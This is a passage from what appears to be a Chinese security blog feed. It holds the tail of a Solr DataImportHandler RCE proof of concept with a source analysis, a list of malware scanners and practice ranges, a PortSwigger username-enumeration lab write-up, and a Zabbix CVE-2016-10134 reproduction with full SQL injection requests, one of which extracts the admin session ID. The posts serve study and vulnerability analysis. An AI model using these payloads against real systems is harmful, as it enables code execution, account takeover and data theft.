class="params">(row)</span></span>{</span></span><br><span class="line"><span class="actionscript"> <span class="keyword">var</span> bufReader = <span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream()));</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> result = [];</span></span><br><span class="line"><span class="actionscript"><span class="keyword">while</span>(<span class="literal">true</span>) {</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> oneline = bufReader.readLine();</span></span><br><span class="line">result.push( oneline );</span><br><span class="line"><span class="actionscript"><span class="keyword">if</span>(!oneline) <span class="keyword">break</span>;</span></span><br><span class="line">}</span><br><span class="line"><span class="actionscript">row.put(<span class="string">"title"</span>,result.join(<span class="string">"\n\r"</span>));</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> row;</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">]]&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">document</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entity</span></span></span><br><span class="line"><span class="tag">        <span class="attr">stream</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">name</span>=<span class="string">"entity1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">datasource</span>=<span class="string">"streamsrc1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">processor</span>=<span class="string">"XPathEntityProcessor"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">rootEntity</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">forEach</span>=<span class="string">"/RDF/item"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">transformer</span>=<span class="string">"script:poc"</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">field</span> <span class="attr">column</span>=<span class="string">"title"</span> <span class="attr">xpath</span>=<span class="string">"/RDF/item/title"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entity</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataConfig</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://image.iwonder.run/imgs/2021/02/87ce8330f09e1768.png" alt=""></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="DataImportHandler模块"><a href="#DataImportHandler模块" class="headerlink" title="DataImportHandler模块"></a>DataImportHandler模块</h4><p>DataImportHandler模块是可选的较为常用的solr插件，用于从关系数据库将数据导入到Solr索引库中，默认情况下即启用此插件。插件位于dist/solr-dataimporthandler-8.1.1.jar和dist/solr-dataimporthandler-extras-8.1.1.jar。</p><h4 id="dataConfig"><a href="#dataConfig" class="headerlink" title="dataConfig"></a>dataConfig</h4><p>DataImportHandler模块的配置信息有两种方法设置，一种是编辑Server的配置文件，一种是使用web请求中的dataConfig参数来指定配置信息DIH配置，该参数用户可控。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2021/02/8f4333f406f0340f.png" alt=""><br>其中&lt;script&gt;标签定义的函数能够在&lt;entity&gt;标签定义的实体中调用，传递到后端时如未设置关键字白名单等既能触发RCE。</p><h4 id="Nashorn引擎"><a href="#Nashorn引擎" class="headerlink" title="Nashorn引擎"></a>Nashorn引擎</h4><p>Nashorn是基于JVM的轻量级高性能的JavaScript运行环境，在Solr的Java环境中使用了Nashorn引擎，因此能够解析解析之行JavaScript定义的函数，同时JavaScript的脚本中也能使用java环境中的类、函数等。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>POC中漏洞触发点的路由是/solr/atom/dataimport，追踪解析此路由的方法到DataImportHandler类的handleRequestBody方法(/solr-8.1.1/dist/solr-dataimporthandler-8.1.1.jar!/org/apache/solr/handler/dataimport/DataImportHandler.class)</p><p>使用getParamsMap函数预处理，检查获取的web参数重是否设置show-config，经过if-else判断POC将最终进入这段代码：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">省略...</span><br><span class="line"><span class="keyword">this</span>.importer.maybeReloadConfiguration(requestParams, defaultParams);</span><br><span class="line">UpdateRequestProcessorChain processorChain = req.getCore().getUpdateProcessorChain(params);</span><br><span class="line">UpdateRequestProcessor processor = processorChain.createProcessor(req, rsp);</span><br><span class="line">SolrResourceLoader loader = req.getCore().getResourceLoader();</span><br><span class="line">DIHWriter sw = <span class="keyword">this</span>.getSolrWriter(processor, loader, requestParams, req);</span><br><span class="line"><span class="keyword">if</span> (requestParams.isDebug()) {</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.debugEnabled) {</span><br><span class="line">        <span class="keyword">this</span>.importer.runCmd(requestParams, sw);</span><br><span class="line">        rsp.add(<span class="string">"mode"</span>, <span class="string">"debug"</span>);</span><br><span class="line">        rsp.add(<span class="string">"documents"</span>, requestParams.getDebugInfo().debugDocuments);</span><br><span class="line">        <span class="keyword">if</span> (requestParams.getDebugInfo().debugVerboseOutput != <span class="keyword">null</span>) {</span><br><span class="line">            rsp.add(<span class="string">"verbose-output"</span>, requestParams.getDebugInfo().debugVerboseOutput);</span><br><span class="line">        }</span><br><span class="line">省略...</span><br></pre></td></tr></tbody></table></figure><p>其中maybeReloadConfiguration函数的作用是检查是否需要重新载入配置；跟进此函数，会将dataConfig的数据传入loadDataConfig方法中，加载DataConfig配置信息。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Document document;</span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line">    document = builder.parse(configFile);</span><br><span class="line">} <span class="keyword">finally</span> {</span><br><span class="line">    IOUtils.closeQuietly(configFile.getByteStream());</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">dihcfg = <span class="keyword">this</span>.readFromXml(document);</span><br></pre></td></tr></tbody></table></figure><p>configFile变量值即经DocumentBuilderFactory类规范的dataConfig数据，最后经readFromXml函数读取，继续跟进readFromXml，此函数最终将传入的script标签内容。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Script script = <span class="keyword">null</span>;</span><br><span class="line">...</span><br><span class="line">List&lt;Element&gt; scriptTags = ConfigParseUtil.getChildNodes(e, <span class="string">"script"</span>);</span><br><span class="line"><span class="keyword">if</span> (!scriptTags.isEmpty()) {</span><br><span class="line">    script = <span class="keyword">new</span> Script((Element)scriptTags.get(<span class="number">0</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> DIHConfiguration((Element)documentTags.get(<span class="number">0</span>), <span class="keyword">this</span>, functions, script, dataSources, pw);</span><br></pre></td></tr></tbody></table></figure><p>最终返回DIHConfiguration对象给dihcfg变量，最终maybeReloadConfiguration得到true。<br>回到handleRequestBody函数中：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UpdateRequestProcessorChain processorChain = req.getCore().getUpdateProcessorChain(params);</span><br><span class="line">UpdateRequestProcessor processor = processorChain.createProcessor(req, rsp);</span><br><span class="line">SolrResourceLoader loader = req.getCore().getResourceLoader();</span><br><span class="line">DIHWriter sw = <span class="keyword">this</span>.getSolrWriter(processor, loader, requestParams, req);</span><br></pre></td></tr></tbody></table></figure><p>这四步顾名思义为调度进程资源和加载器，得到DIHWriter实例sw，传入runCmd函数（/solr-8.1.1/dist/solr-dataimporthandler-8.1.1.jar!/org/apache/solr/handler/dataimport/DataImport.class）中执行。<br>runCmd方法中读取command参数值(full-import)，最终进入doFullImport函数中，关键代码如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.docBuilder = <span class="keyword">new</span> DocBuilder(<span class="keyword">this</span>, writer, dihPropWriter, requestParams);</span><br><span class="line"><span class="keyword">this</span>.checkWritablePersistFile(writer, dihPropWriter);</span><br><span class="line"><span class="keyword">this</span>.docBuilder.execute();</span><br></pre></td></tr></tbody></table></figure><p>这里的writer即DIHWriter实例sw，checkWritablePersistFile方法功能室检查是否支持增量模式和DIH配置可写，跟进DocBuilder类的execute方法（/solr-8.1.1/dist/solr-dataimporthandler-8.1.1.jar!/org/apache/solr/handler/dataimport/DocBuilder.class），这里的dataImporter是初始化DocBuilder的第一个参数，this.dataImporter.getStatus()得到的是增量备份或全量备份，最终进入的的doFullDump函数中，跟进至buildDocument函数。这一步的作用是迭代执行每一个VariableResolver类的变量(getVariableResolver()的返回值)，如果执行过程中发生错误，则捕获并丢弃，即仅解析正常的的Processor。同时buildDocument函数还支持Transformers，当发送的entity中含有Transformers时，会进行相应的转换操作。</p><p>跟进点在476行的Map&lt;String, Object&gt; arow = epw.nextRow();这里调用了nextRow方法实现迭代，容易发现迭代每一个EntityProcessorWrapper的对象时都会调用applyTransformer函数。跟进applyTransformer函数调用的的loadTransformers函数中。此函数首先获取dataConfig中设置的transformer字段，即用户可控。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2021/02/2596bbb8b527baeb.jpeg" alt=""></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String transClasses = <span class="keyword">this</span>.context.getEntityAttribute(<span class="string">"transformer"</span>);</span><br></pre></td></tr></tbody></table></figure><p>到这里终于找到用户可控的参数，追踪到调用的ScriptTransformer的transformRow，transformRow方法体中的语句this.initEngine(context);调用了initEngine方法(该方法只做初始化，并未执行JavaScript脚本)，最终this.engine.invokeFunction(this.functionName, row, context)这里调用了Nashorn脚本引擎在java环境中执行JavaScript脚本，这一函数仅在ScriptTransformer类中被调用。</p><h3 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h3><p>跟踪过程中涉及的函数较多，需要长时间审计才能在众多调用的函数中找到关键点，java审计要困难好多啊。大体思路可以简化为：根据POC找参数处理函数-&gt;关键函数溯源-&gt;找Nashorn引擎执行函数-&gt;反向溯源-&gt;重复重复重复。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20210210110211</title>
      <link href="/2021/02/10/20210210110211/"/>
      <url>/2021/02/10/20210210110211/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>工具箱</title>
      <link href="/2021/01/22/gong-ju-xiang/"/>
      <url>/2021/01/22/gong-ju-xiang/</url>
      
        <content type="html"><![CDATA[<h2 id="在线病毒扫描"><a href="#在线病毒扫描" class="headerlink" title="在线病毒扫描"></a>在线病毒扫描</h2><ul><li>VirSCAN：<a href="https://www.virscan.org/" target="_blank" rel="noopener">https://www.virscan.org/</a></li><li>VirusTotal：<a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a></li><li>Jotti：<a href="https://virusscan.jotti.org" target="_blank" rel="noopener">https://virusscan.jotti.org</a></li><li>ScanVir：<a href="http://www.scanvir.com" target="_blank" rel="noopener">http://www.scanvir.com</a></li></ul><h2 id="离线查杀工具"><a href="#离线查杀工具" class="headerlink" title="离线查杀工具"></a>离线查杀工具</h2><ul><li>Dr.Web CureIt：<a href="https://free.drweb.ru/download+cureit+free/" target="_blank" rel="noopener">https://free.drweb.ru/download+cureit+free/</a></li><li>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe" target="_blank" rel="noopener">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a></li><li>Rootkit<ul><li>chkrootkit：<a href="http://www.chkrootkit.org" target="_blank" rel="noopener">http://www.chkrootkit.org</a></li><li>rkhunter：<a href="http://rkhunter.sourceforge.net" target="_blank" rel="noopener">http://rkhunter.sourceforge.net</a></li></ul></li></ul><h2 id="Webshell-检测"><a href="#Webshell-检测" class="headerlink" title="Webshell 检测"></a>Webshell 检测</h2><ul><li>D 盾_Web 查杀：<a href="http://www.d99net.net/index.asp" target="_blank" rel="noopener">http://www.d99net.net/index.asp</a></li><li>百度 WEBDIR+：<a href="https://scanner.baidu.com/" target="_blank" rel="noopener">https://scanner.baidu.com/</a></li><li>河马 webshell 查杀：<a href="http://www.shellpub.com" target="_blank" rel="noopener">http://www.shellpub.com</a></li><li>Web Shell Detector：<a href="http://www.shelldetector.com/" target="_blank" rel="noopener">http://www.shelldetector.com/</a></li></ul><h2 id="在线沙箱"><a href="#在线沙箱" class="headerlink" title="在线沙箱"></a>在线沙箱</h2><ul><li>Any.Run：<a href="https://app.any.run/" target="_blank" rel="noopener">https://app.any.run/</a></li><li>微步云沙箱：<a href="https://s.threatbook.cn/" target="_blank" rel="noopener">https://s.threatbook.cn/</a></li><li>VirusTotal：<a href="https://www.virustotal.com/gui/" target="_blank" rel="noopener">https://www.virustotal.com/gui/</a></li><li>Joe Sanbox:<a href="https://www.joesandbox.com/" target="_blank" rel="noopener">https://www.joesandbox.com/</a></li><li>腾讯哈勃分析系统：<a href="https://habo.qq.com/" target="_blank" rel="noopener">https://habo.qq.com/</a></li><li>360 沙箱云：<a href="https://ata.360.cn/detection" target="_blank" rel="noopener">https://ata.360.cn/detection</a></li><li>奇安信沙箱：<a href="https://sandbox.ti.qianxin.com/sandbox/page" target="_blank" rel="noopener">https://sandbox.ti.qianxin.com/sandbox/page</a></li><li>微点沙箱：<a href="https://sandbox.depthsec.com.cn/index.php/" target="_blank" rel="noopener">https://sandbox.depthsec.com.cn/index.php/</a></li><li>魔盾安全分析：<a href="https://www.maldun.com/analysis/" target="_blank" rel="noopener">https://www.maldun.com/analysis/</a></li><li>大圣云沙箱：<a href="https://mac-cloud.riskivy.com" target="_blank" rel="noopener">https://mac-cloud.riskivy.com</a></li></ul><h2 id="在线靶场"><a href="#在线靶场" class="headerlink" title="在线靶场"></a>在线靶场</h2><ol><li>BUUCTF 在线评测：<a href="https://buuoj.cn" target="_blank" rel="noopener">https://buuoj.cn</a></li><li>Vulhub 漏洞环境集合：<a href="https://vulhub.org" target="_blank" rel="noopener">https://vulhub.org</a></li><li>韩国 Webhacking：<a href="https://webhacking.kr" target="_blank" rel="noopener">https://webhacking.kr</a></li><li>重生信息安全在线靶场：<a href="https://bc.csxa.cn" target="_blank" rel="noopener">https://bc.csxa.cn</a></li><li>网络信息安全攻防学习平台：<a href="http://hackinglab.cn" target="_blank" rel="noopener">http://hackinglab.cn</a></li><li>墨者学院在线靶场：<a href="https://www.mozhe.cn/bug" target="_blank" rel="noopener">https://www.mozhe.cn/bug</a></li><li>封神台在线演练靶场：<a href="https://hack.zkaq.cn/battle" target="_blank" rel="noopener">https://hack.zkaq.cn/battle</a></li><li>安鸾渗透实战平台：<a href="http://www.whalwl.cn/home" target="_blank" rel="noopener">http://www.whalwl.cn/home</a></li><li>XSS Challenges：<a href="http://xss-quiz.int21h.jp" target="_blank" rel="noopener">http://xss-quiz.int21h.jp</a></li><li>U2 安全巡航靶场：<a href="http://scan.vulspace.com" target="_blank" rel="noopener">http://scan.vulspace.com</a></li><li>MS08067 实战型训练平台：<a href="http://bachang.ms08067.com" target="_blank" rel="noopener">http://bachang.ms08067.com</a></li><li>东塔在线靶场：<a href="https://labs.do-ta.com/index/course/index" target="_blank" rel="noopener">https://labs.do-ta.com/index/course/index</a></li></ol><h2 id="漏洞靶场"><a href="#漏洞靶场" class="headerlink" title="漏洞靶场"></a>漏洞靶场</h2><ol><li>DVWA：<a href="http://www.dvwa.co.uk" target="_blank" rel="noopener">http://www.dvwa.co.uk</a></li><li>BWVS：<a href="https://github.com/bugku/BWVS" target="_blank" rel="noopener">https://github.com/bugku/BWVS</a></li><li>BWAPP：<a href="https://sourceforge.net/projects/bwapp" target="_blank" rel="noopener">https://sourceforge.net/projects/bwapp</a></li><li>WAVSEP：<a href="https://github.com/sectooladdict/wavsep" target="_blank" rel="noopener">https://github.com/sectooladdict/wavsep</a></li><li>VulnStack：<a href="http://vulnstack.qiyuanxuetang.net/vuln" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln</a></li><li>Sqli-Labs：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></li><li>Webug 3.0：<a href="https://pan.baidu.com/s/1eRIB3Se" target="_blank" rel="noopener">https://pan.baidu.com/s/1eRIB3Se</a></li><li>Upload-labs：<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></li><li>Metasploitable：<a href="https://github.com/rapid7/metasploitable3" target="_blank" rel="noopener">https://github.com/rapid7/metasploitable3</a></li><li>DVWA-WooYun：<a href="https://sourceforge.net/projects/dvwa-wooyun" target="_blank" rel="noopener">https://sourceforge.net/projects/dvwa-wooyun</a></li><li>OWASP Mutillidae：<a href="https://sourceforge.net/projects/mutillidae" target="_blank" rel="noopener">https://sourceforge.net/projects/mutillidae</a></li><li>Web for Pentester：<a href="https://www.pentesterlab.com/exercises/web_for_pentester" target="_blank" rel="noopener">https://www.pentesterlab.com/exercises/web_for_pentester</a></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Portswigger Username Enumeration</title>
      <link href="/2020/12/22/portswigger-username-enumeration/"/>
      <url>/2020/12/22/portswigger-username-enumeration/</url>
      
        <content type="html"><![CDATA[<h2 id="via-differrnt-responses"><a href="#via-differrnt-responses" class="headerlink" title="via differrnt responses"></a>via differrnt responses</h2><p>使用提供的username和password，先使用burpsuite intruder的sniper设置负载位置为username，密码随意写找出可能存在的用户名。爆出用户名后再将负载位置设为password，爆出密码。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/7532292890a5149b.png" alt=""></p><h2 id="via-subtly-different-responses"><a href="#via-subtly-different-responses" class="headerlink" title="via subtly different responses"></a>via subtly different responses</h2><p>提示回显细微不同，相同的思路先找username，但是发现有多种错误回显，利用options中的GrepExtract，匹配包含关键区的responses，因为“&lt;p class=is-warning&gt;Invalid username or password.&lt;/p&gt;”肯定是响应请求后生成的插入的语句，因此将此段设置为匹配值，启动攻击。<br>貌似所有回显都包含这一段，仔细审查会发现，username=ansible时回显的内容是“&lt;p class=is-warning&gt;Invalid username or password&lt;/p&gt;”，说明这就是用户名。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/5085fff3ee00e953.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/65783447981dfc3b.png" alt=""></p><h2 id="via-response-timing"><a href="#via-response-timing" class="headerlink" title="via response timing"></a>via response timing</h2><p>根据响应时间的差异，爆出username。原理是提交username和password处的表单时，后端会现将username与数据库中的用户名进行比对，如果没有找到直接返回错误，如果找到一致的username，则会再去查询password字段是否正确，由此产生时间的差异性。<br>这里有请求IP的限制，使用X-Forwarded-For绕过限制。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/0705a8717e2a65da.png" alt=""><br>实际测试时会有多个请求包和应答包相差较大的情况，逐个试一下就能找到正确的用户名,找到用户名后对password进行爆破即可。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>zabbix SQL注入漏洞（CVE-2016-10134）</title>
      <link href="/2020/12/20/zabbix-sql-zhu-ru-lou-dong-cve-2016-10134/"/>
      <url>/2020/12/20/zabbix-sql-zhu-ru-lou-dong-cve-2016-10134/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Zabbix 是一个基于 WEB 界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供优秀的通知机制以让系统管理员快速定位/解决存在的各种问题。<br>Zabbix由server和agent两部分组成，zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能；zabbix agent需要安装在被监视的目标服务器上，它主要完成对硬件信息或与操作系统有关的内存，CPU等信息的收集。</p><p>zabbix server可单独运行见识远程服务器的服务状态，同时也可以agent配合，以轮询或被动方式访问agent收集的数据</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Zabbix 2.2.14之前的版本和3.0.4之前的3.0版本</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>burpsuite截包先获取zbx_sessionid和PHPSESSID，然后利用updatexml报错注入</p><pre><code>GET /jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,user()),0) HTTP/1.1Host: 127.0.0.1:9090User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://127.0.0.1:9090/Cookie: zbx_sessionid=4e02fb6e2a62385bf9f27bb9a9fc1b5b; PHPSESSID=01ovjgng5c9o6umeggstg1tkp3Connection: close</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/dd1476577f3e6a5a.png" alt=""></p><p>也可以爆出管理员的sessionid直接进入后台</p><pre><code>GET /jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,(select%20sessionid%20from%20sessions%20limit%200,1),0x7e)))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a) HTTP/1.1Host: 127.0.0.1:9090User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://127.0.0.1:9090/Cookie: zbx_sessionid=4e02fb6e2a62385bf9f27bb9a9fc1b5b; PHPSESSID=01ovjgng5c9o6umeggstg1tkp3Connection: close</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/48404d1b2ed1b6c7.png" alt=""></p><p>这个洞也可以从latest.php触发，其中sid是zbx_sessionid的后16位</p><pre><code>GET /latest.php?output=ajax&amp;sid=f9f27bb9a9fc1b5b&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0) HTTP/1.1Host: 127.0.0.1:9090User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://127.0.0.1:9090/Cookie: zbx_sessionid=4e02fb6e2a62385bf9f27bb9a9fc1b5b; PHPSESSID=01ovjgng5c9o6umeggstg1tkp3Connection: close</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/efbd778e0f8e6534.png" alt=""></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>因为是SQL注入，于是从URL入手分析</p><h4 id="利用jsrpc-php进行注入"><a href="#利用jsrpc-php进行注入" class="headerlink" title="利用jsrpc.php进行注入"></a>利用jsrpc.php进行注入</h4><p>报错注入的语句：</p><pre><code>jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,user()),0)</code></pre><p>从jsrpc.php文件出发，getRequest函数判断type字段是否设置，若未设置则设为函数的第二个参数or null，这里为如果type字段未设置，以json格式解析请求体。type设置为0，默认以html格式解析。</p><pre><code>$requestType = getRequest('type', PAGE_TYPE_JSON);function getRequest($name, $def = null) {    return isset($_REQUEST[$name]) ? $_REQUEST[$name] : $def;}</code></pre><p>method设置为screen.get，直接跳转到184行<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/fba66612f4003d46.png" alt=""><br>这里的$data==$_REQUESTS,将url的参数数组传入CScreenBuilder::getScreen()，定位到zabbix-3.0.3/frontends/php/include/classes/screens/CScreenBuilder.php第171行，由于设置了resourcetype=17，因此追溯到zabbix-3.0.3/frontends/php/include/classes/screens/CScreenHistory.php第80行。<br>到这里清楚的是$screen = $screenBase-&gt;get();这行代码得到的是一个CScreenHistory-&gt;get()的输出，且由于mode=1，$result为CScreenHistory-&gt;get()-&gt;toString();这个get函数大体是根据$_REQUESTS中是否设置了一些字段的值，来确定返回的$output数组的内容。<br>回过来看CScreenBuilder.php的构造函数，其中设定了profileIdx和profileIdx2<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/732a8a74132a326c.png" alt=""><br>追踪calculateTime函数到zabbix-3.0.3/frontends/php/include/classes/screens/CScreenBase.php第425行，大体逻辑是根据传入的$options数组中updateProfile、period等变量的值，对其余变量进行初始化。且：</p><pre><code>if (!array_key_exists('updateProfile', $options)) {    $options['updateProfile'] = true;}...if (empty($options['period'])) {    $options['period'] = !empty($options['profileIdx'])    ? CProfile::get($options['profileIdx'].'.period', ZBX_PERIOD_DEFAULT, $options['profileIdx2'])    : ZBX_PERIOD_DEFAULT;}...if ($options['updateProfile'] &amp;&amp; !empty($options['profileIdx'])) {    CProfile::update($options['profileIdx'].'.period', $options['period'], PROFILE_TYPE_INT, 